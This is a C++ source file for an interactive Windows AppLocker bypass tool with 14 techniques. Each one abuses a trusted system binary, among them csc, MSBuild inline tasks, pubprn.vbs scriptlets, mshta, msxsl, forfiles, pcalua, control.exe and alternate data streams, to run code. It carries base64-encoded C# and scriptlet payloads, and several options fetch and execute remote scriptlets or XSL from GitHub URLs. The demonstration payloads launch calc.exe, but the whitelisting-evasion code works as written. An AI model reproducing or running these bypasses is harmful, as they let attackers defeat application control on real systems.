#include "Applocker.h"
#include <iostream>
#include <string>
#include "windows.h"
#include <fstream>
#include "base64.h"
using namespace std;

string GetProgramDir()
{
	char exeFullPath[MAX_PATH]; // Full path
	string strPath = "";

	GetModuleFileName(NULL, exeFullPath, MAX_PATH);
	strPath = (string)exeFullPath;    // Get full path of the file
	size_t pos = strPath.find_last_of('\\', strPath.length());
	return strPath.substr(0, pos);  // Return the directory without the file name
}

Applocker::Applocker()
{	
	CreateDirectory(TEXT("output"), NULL);//创建output空目录
	system("cls");
	cout << "			 /==========================########=========================\\  \n\
			 |               #MY Blog: www.ggsec.cn#                     |  \n\
	    	         |  	        #Windows AppLocker ByPass#                   |  \n\
			 |          Secist Anniversary Edition v1.0 | Demon 2017.7.14|	\n\
			 \\===========================================================/  \n " << endl;
	cout << "			           Windows AppLocker ByPass | Demon-secist   \n\n\
			  1. .Net_c#_calc                    11. Mxsl demo.xml exec.xsl |calc\n \
	                  2. CScript_calc                    12. Msxsl.exe  |Calc\n \
	                  3. MSbuild_calc                    13. Control.exe  |  Calc\n \
	                  4. CL_Invocation_Powershel_Calc    14. ADS(Alternate data streams)Control |Calc  \n \
	                  5. Forfiles | Notepad| Calc        \n \
	                  6. Mshta | Noteopad     \n \
	                  7. pcalua |Calc   \n \
	                  8. MSBuild-Csi.exe | Calc  \n \
	                  9.  exit   \n \
	                  10. About Me \n\n\
	                           secist > " << flush;


	int value;
	cin >> value;
	cout << endl;


	if (value == 1) {
		std::string str1 = "dXNpbmcgU3lzdGVtOwpuYW1lc3BhY2UgSGVsbG9Xb3JsZAp7CiAgICBjbGFzcyBQcm9ncmFtCiAgICB7CiAgICAgICAgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQogICAgICAgIHsKICAgICAgICAgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MuU3RhcnQoImNhbGMuZXhlIik7ICAKICAgICAgICB9CiAgICB9Cn0=";
		std::ofstream ocout;//输出流的一个对象
		ocout.open("output\\secist.cs");
		ocout << b64decodestring(str1);
		ocout.close();
		system("c:\\windows\\microsoft.net\\framework\\v4.0.30319\\csc.exe /out:output\\secist.exe output\\secist.cs &&  output\\secist.exe");

	}



	else if (value == 2)
	{
		std::string str2 = "PHNjcmlwdGxldD4KCTxzY3JpcHQgbGFuZ3VhZ2U9IlZCU2NyaXB0LkVuY29kZSI+CgkJCSNAfl5OQUFBQUE9PU9/L08sJyxaRH9sRG5yKExubURgRQlVbURiMlljP3R/c3NKKlIiRVVgRV5tVl5Sf2ErciNhaEVBQUE9PV4jfkAgCgoJPC9zY3JpcHQ+Cjwvc2NyaXB0bGV0Pg==";
		std::ofstream ocout;
		ocout.open("output\\demon.png");
		ocout << b64decodestring(str2);
		ocout.close();
		string dir2 = "cscript c:\\windows\\system32\\printing_admin_scripts\\zh-cn\\pubprn.vbs localhost \"script: ";
	    dir2 += GetProgramDir();
		dir2 += "\\\output\\demon.png\" ";
		system(dir2.c_str());
	}



	else if (value == 3)
	{
		std::string str3 = "PFByb2plY3QgVG9vbHNWZXJzaW9uPSI0LjAiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL2RldmVsb3Blci9tc2J1aWxkLzIwMDMiPgogIDwhLS0gVGhpcyBpbmxpbmUgdGFzayBleGVjdXRlcyBjIyBjb2RlLiAtLT4KICA8IS0tIEM6XFdpbmRvd3NcTWljcm9zb2Z0Lk5FVFxGcmFtZXdvcmtcdjQuMC4zMDMxO\
Vxtc2J1aWxkLmV4ZSBwb3dhU2hlbGwuY3Nwcm9qIC0tPgogIDxUYXJnZXQgTmFtZT0iSGVsbG8iPgogICA8Q2xhc3NFeGFtcGxlIC8+CiAgPC9UYXJnZXQ+CiAgICA8VXNpbmdUYXNrCiAgICBUYXNrTmFtZT0iQ2xhc3NFeGFtcGxlIgogICAgVGFza0ZhY3Rvcnk9IkNvZGVUYXNrRmFjdG9yeSIKICAgIEFzc2VtYmx5RmlsZT0iQzpcV2luZG93c1xNaWNyb3NvZnQuTm\
V0XEZyYW1ld29ya1x2NC4wLjMwMzE5XE1pY3Jvc29mdC5CdWlsZC5UYXNrcy52NC4wLmRsbCIgPgogICAgPFRhc2s+CiAgICAgPFJlZmVyZW5jZSBJbmNsdWRlPSJDOlxXaW5kb3dzXGFzc2VtYmx5XEdBQ19NU0lMXFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb25cMS4wLjAuMF9fMzFiZjM4NTZhZDM2NGUzNVxTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLmR\
sbCIgLz4KICAgICA8IS0tIFlvdXIgUG93ZXJTaGVsbCBQYXRoIE1heSB2YXJ5IC0tPgogICAgICA8Q29kZSBUeXBlPSJDbGFzcyIgTGFuZ3VhZ2U9ImNzIj4KICAgICAgICA8IVtDREFUQVsKICAgICAgICAgICAgdXNpbmcgU3lzdGVtOwogICAgICAgICAgICB1c2luZyBTeXN0ZW0uUmVmbGVjdGlvbjsKICAgICAgICAgICAgdXNpbmcgTWljcm9zb2Z0LkJ1aWxkLkZy\
YW1ld29yazsKICAgICAgICAgICAgdXNpbmcgTWljcm9zb2Z0LkJ1aWxkLlV0aWxpdGllczsgICAgICAgICAgICAKICAgICAgICAgICAgdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLk9iamVjdE1vZGVsOwogICAgICAgICAgICB1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uOwogICAgICAgICAgICB1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0a\
W9uLlJ1bnNwYWNlczsKICAgICAgICAgICAgdXNpbmcgU3lzdGVtLlRleHQ7ICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgcHVibGljIGNsYXNzIENsYXNzRXhhbXBsZSA6ICBUYXNrLCBJVGFzawogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBwdWJsaWMgb3ZlcnJpZGUgYm9vbCBFeGVjdXRlKCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgIC\
AgICAgICBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzcy5TdGFydCgiY2FsYyIpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHB1YmxpYyBjbGFzcyBwb3dhU2hlbGwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgUnVuUFNDb21\
tYW5kKCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBJbml0aWFsU2Vzc2lvblN0YXRlIGlzcyA9IEluaXRpYWxTZXNzaW9uU3RhdGUuQ3JlYXRlRGVmYXVsdCgpOwogICAgICAgICAgICAgICAgICAgIGlzcy5MYW5ndWFnZU1vZGUgPSBQU0xhbmd1YWdlTW9kZS5GdWxsTGFuZ3VhZ2U7CiAgICAgICAgICAgICAgICAgICAgUnVuc3BhY2UgcnVu\
c3BhY2UgPSBSdW5zcGFjZUZhY3RvcnkuQ3JlYXRlUnVuc3BhY2UoaXNzKTsKICAgICAgICAgICAgICAgICAgICBydW5zcGFjZS5PcGVuKCk7CiAgICAgICAgICAgICAgICAgICAgUnVuc3BhY2VJbnZva2Ugc2NyaXB0SW52b2tlciA9IG5ldyBSdW5zcGFjZUludm9rZShydW5zcGFjZSk7CiAgICAgICAgICAgICAgICAgICAgUGlwZWxpbmUgcGlwZWxpbmUgPSBydW5zcG\
FjZS5DcmVhdGVQaXBlbGluZSgpOwogQ29uc29sZS5Xcml0ZUxpbmUoU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5TZWN1cml0eS5TeXN0ZW1Qb2xpY3kuR2V0U3lzdGVtTG9ja2Rvd25Qb2xpY3koKSk7ICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHBpcGVsaW5lLkNvbW1hbmRzLkFkZFNjcmlwdCgiW01hdGhdOjpTcXJ0KDkpIik7IAogICA\
gICAgICAgICAgICAgICAgIC8vUHJlcCBQUyBmb3Igc3RyaW5nIG91dHB1dCBhbmQgaW52b2tlCiAgICAgICAgICAgICAgICAgICAgcGlwZWxpbmUuQ29tbWFuZHMuQWRkKCJPdXQtU3RyaW5nIik7CiAgICAgICAgICAgICAgICAgICAgQ29sbGVjdGlvbjxQU09iamVjdD4gcmVzdWx0cyA9IHBpcGVsaW5lLkludm9rZSgpOwogICAgICAgICAgICAgICAgICAgIHJ1bnNw\
YWNlLkNsb3NlKCk7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nQnVpbGRlciBzdHJpbmdCdWlsZGVyID0gbmV3IFN0cmluZ0J1aWxkZXIoKTsKICAgICAgICAgICAgICAgICAgICBmb3JlYWNoIChQU09iamVjdCBvYmogaW4gcmVzdWx0cykKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZ0J1aWxkZXIuQXBwZW5kKG9ia\
ik7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHJldHVybiBzdHJpbmdCdWlsZGVyLlRvU3RyaW5nKCkuVHJpbSgpOyAgICAgICAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgXV0+CiAgICAgIDwvQ29kZT4KICAgIDwvVGFzaz4KICA8L1VzaW5nVGFzaz4KPC9Qcm9qZWN0Pg==";
		std::ofstream ocout;//定义输出流的一个对象
		ocout.open("output\\secist.csproj");
		ocout << b64decodestring(str3);
		ocout.close();
		system("c:\\windows\\microsoft.net\\framework\\v4.0.30319\\msbuild.exe  output\\secist.csproj");
	}



	else if (value == 4)
	{
		cout << "  powershell_uac_set-executionpolic   (y/n) >" << flush;
		char yes;
		cin >> yes;
		if (yes == 'y' || yes == 'y') {
			ShellExecute(NULL, "runas", "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "set-executionpolicy -executionpolicy unrestricted ", NULL, SW_SHOWNORMAL);
		}

		else if (yes == 'n' || yes == 'n') {
			system("powershell.exe get-authenticodesignature c:\\windows\\diagnostics\\system\\aero\\cl_invocation.ps1;. c:\\windows\\diagnostics\\system\\aero\\cl_invocation.ps1;syncinvoke  calc.exe");
		}

	}

	else if (value == 5)
	{
		system("forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe ");
	}



	else if (value == 6)
	{

		system("mshta.exe javascript:a=getobject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/windows/payloads/mshta.sct\").exec();close();");
	}



	else if (value == 7)
	{
		system("c:\\windows\\system32\\pcalua.exe -a calc.exe");
	}

	else if (value == 8)
	{
		std::string str8 = "using system;system.diagnostics.process.start(\"calc.exe\");";
		std::ofstream ocout;//输出流的一个对象
		ocout.open("output\\secist.csx");
		ocout << str8;
		ocout.close();
		system("\"c:\\program files (x86)\\msbuild\\14.0\\bin\\csi.exe\" output\\secist.csx");
	}


	else if (value == 9)
	{
		exit(1);
	}

	else if (value == 10)
	{
		about();

	}

	else if (value == 11)
	{
		system(".\\example\\msxsl.exe   https://\gist.githubusercontent.com/\demonsec666/\e897c2dbf06a6f3d8e9f131d155426ad/raw/e5f19f919c1a081d3b7e2fbd9fe8a623cf70371f/\demo.xml    https://\gist.githubusercontent.com/\demonsec666/\cd806e079f47f1ef3fa9e6c33a439f75/raw/5e1727d948510e4af8dfcbbf6e2c8d8896080ebc/\exec.xsl");
	}

	else if (value == 12)
	{
		system(".\\example\\tracker.exe /d runcalc.dll /c calc");
		//    .\example\tracker.exe /d runcalc.dll /c cmd
	}


	else if (value == 13)
	{
		system("control  .\\example\\runcalc.dll");
	}



	else if (value == 14)
	{
		system("type .\\example\\runcalc.dll >  .\\example\\demon:secist.dll | control   .\\example\\demon:secist.dll  ");
	}


	else
	{
		cout << "无效选项" << endl;
		system("pause");
	}
	dir();
}


dir::dir() {
	// 判断目录是否为空 
	HANDLE hFind;
	WIN32_FIND_DATA FindFileData;
	if ((hFind = FindFirstFileA("Output\\*.*", &FindFileData)) != INVALID_HANDLE_VALUE)
	{
		BOOL bFind = TRUE;
		BOOL EmptyDirectory = TRUE;
		while (bFind)
		{
			if (strcmp(FindFileData.cFileName, ".") == 0
				|| strcmp(FindFileData.cFileName, "..") == 0)
			{
				bFind = FindNextFile(hFind, &FindFileData);
			}
			else
			{
				//有子文件夹也算非空
				EmptyDirectory = FALSE;
				break;
			}
		}
		if (EmptyDirectory)
		{
			//删除空目录
			RemoveDirectory("Output");
		}
		else
		{
			//删除非空目录
			system("rd/s/q Output");
		}
		//dir();
	}
	else
	{
		cout << "Path does not exist." << endl;
	}

}

about::about() {
	  system("cls");
	  std::cout<<"  Who am I? \n\
         Hi there, I'm Demon. I have an interest in technology, both development of applications \n\
as well as systems administrations -- focussing mostly on Linux and everything open source. \n\n\
About my team\n\
         secist(http://www.secist.com) is a volunteer group focused on promoting writers and their writing in\
 a professional way, across differentsocial media platforms for free.We provide a platform for those \
 with a story to tell, knowledge to share, or an experience that we can all learn from.If you are a new \
or emerging writer, work with us to raise your profile, polish your articles and present your work in the \
best possible light. \n\n\
         I will always remember something my father told me, “you have to help enough other people get what they \
want first, before you can get what you want out of life”. \n\n\
Join us! Support secist in championing the work of others. \n\n\
Contact\n\n\
         I'm best contacted through e-mail, at 1955270830@qq.com.Also welcome you to join our discussion group through QQ,account number 307283889.\
You can ask me technological questions, but please don't be mad if I don't reply : I tend get a lot of e - mail.I do my best to respond\
 to all of them -- but that doesn't always work. If I don't respond in time, feel free to send a reminder."<<std::endl;


}
